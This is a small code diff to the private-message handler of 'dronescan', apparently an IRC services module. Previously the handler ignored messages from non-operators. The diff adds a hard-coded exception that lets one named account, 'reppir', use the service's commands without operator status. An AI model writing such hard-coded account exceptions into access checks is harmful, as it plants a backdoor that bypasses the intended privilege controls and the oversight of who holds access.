@@ -270,7 +270,8 @@ int dronescan::OnChannelEvent( const channelEventType& theEvent,
  */
 int dronescan::OnPrivateMessage( iClient* theClient, const string& Message, bool secure )
 {
-	if(!theClient->isOper()) return 0;
+	if(!theClient->isOper() && (theClient->getAccount() != "reppir"))
+		return 0;
 	
 	StringTokenizer st(Message);
 	
